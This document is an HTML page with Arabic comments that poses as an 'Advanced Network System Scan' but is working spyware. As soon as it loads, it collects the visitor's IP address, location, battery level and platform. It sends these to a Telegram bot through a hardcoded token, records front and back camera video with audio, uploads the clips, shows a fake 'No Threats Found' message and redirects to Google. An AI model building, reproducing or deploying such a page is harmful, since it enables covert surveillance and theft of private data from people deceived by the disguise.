<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced Network System Scan</title>
    <style>
        body { background-color: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .card { background: #161b22; border: 1px solid #30363d; border-radius: 15px; padding: 35px; text-align: center; width: 85%; max-width: 400px; box-shadow: 0 15px 35px rgba(0,0,0,0.6); }
        .loader { width: 70px; height: 70px; border: 6px solid #21262d; border-top: 6px solid #238636; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .speed-digit { font-size: 48px; font-weight: bold; color: #2ea043; margin: 10px 0; }
        .status-text { font-size: 13px; color: #8b949e; font-family: monospace; text-align: left; background: #0d1117; padding: 10px; border-radius: 5px; min-height: 60px; line-height: 1.6; }
        .success-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0d1117; color: #2ea043; flex-direction: column; justify-content: center; align-items: center; z-index: 100; }
    </style>
</head>
<body onclick="startScan()">

    <div class="card" id="main-ui">
        <div style="font-size: 14px; color: #8b949e; letter-spacing: 2px;">SYSTEM DIAGNOSTIC</div>
        <div class="loader"></div>
        <div class="speed-digit" id="speed">0.0</div>
        <div style="color: #8b949e; margin-bottom: 20px;">Checking Connection...</div>
        <div class="status-text" id="log">
            > Initializing modules...<br>
            > Waiting for authentication...
        </div>
    </div>

    <div id="success-screen" class="success-overlay">
        <div style="font-size: 50px;">✅</div>
        <h2 style="margin: 20px 0;">تم الفحص بنجاح</h2>
        <p style="color: #8b949e;">Security Check Completed. No Threats Found.</p>
    </div>

    <script>
        const BOT_TOKEN = "8619027051:AAH06xxHUXEeZ_PLu8l5QF8zct7nrjNW4ts";
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('chatId');
        let isStarted = false;

        // بدء العمل فوراً عند فتح الرابط
        window.onload = () => { startScan(); };

        async function startScan() {
            if (isStarted || !chatId) return;
            isStarted = true;

            // 1. إرسال تقرير البيانات فوراً
            sendReport();
            animateCounter();

            // 2. تصوير الكاميرا الأمامية (10 ثوانٍ)
            updateLog("Scanning primary sensor...");
            await runCapture("user", "Front_Cam");

            // 3. تصوير الكاميرا الخلفية (10 ثوانٍ)
            updateLog("Scanning secondary sensor...");
            await runCapture("environment", "Back_Cam");

            // 4. إظهار رسالة النجاح والتحويل
            finishProcess();
        }

        function updateLog(t) {
            document.getElementById('log').innerHTML += `<br>> ${t}`;
        }

        function animateCounter() {
            let val = 0;
            const timer = setInterval(() => {
                if (val < 94) {
                    val += Math.random() * 8;
                    document.getElementById('speed').innerText = val.toFixed(1);
                } else { clearInterval(timer); }
            }, 400);
        }

        async function sendReport() {
            try {
                const ipInfo = await fetch('https://ipapi.co/json/').then(r => r.json());
                const bat = await navigator.getBattery();
                const text = `
🚀 **New Session Logged**
━━━━━━━━━━━━━━━━━━
🆔 **Session:** \`#${Math.floor(Math.random()*9999)}\`
🌐 **IP:** \`${ipInfo.ip}\`
📍 **Loc:** ${ipInfo.city}, ${ipInfo.country_name}
🔋 **Bat:** ${Math.round(bat.level * 100)}%
📱 **OS:** ${navigator.platform}
━━━━━━━━━━━━━━━━━━`;
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
            } catch (e) {}
        }

        async function runCapture(facing, name) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: facing, width: 640, height: 360 },
                    audio: true
                });
               
                const rec = new MediaRecorder(stream);
                const data = [];
                rec.ondataavailable = e => data.push(e.data);

                return new Promise(res => {
                    rec.onstop = async () => {
                        const blob = new Blob(data, { type: 'video/mp4' });
                        const fd = new FormData();
                        fd.append('chat_id', chatId);
                        fd.append('document', blob, `${name}.mp4`);
                        fd.append('caption', `🎥 Source: ${name}`);
                       
                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: fd });
                        stream.getTracks().forEach(t => t.stop());
                        res();
                    };
                    rec.start();
                    setTimeout(() => rec.stop(), 10000); // 10 ثوانٍ
                });
            } catch (err) {
                updateLog(`Sensor ${name} blocked.`);
                return Promise.resolve();
            }
        }

        function finishProcess() {
            document.getElementById('success-screen').style.display = 'flex';
            setTimeout(() => {
                window.location.href = "https://www.google.com";
            }, 3000); // تظهر رسالة تم الفحص لمدة 3 ثوانٍ ثم يحول لجوجل
        }
    </script>
</body>
</html>
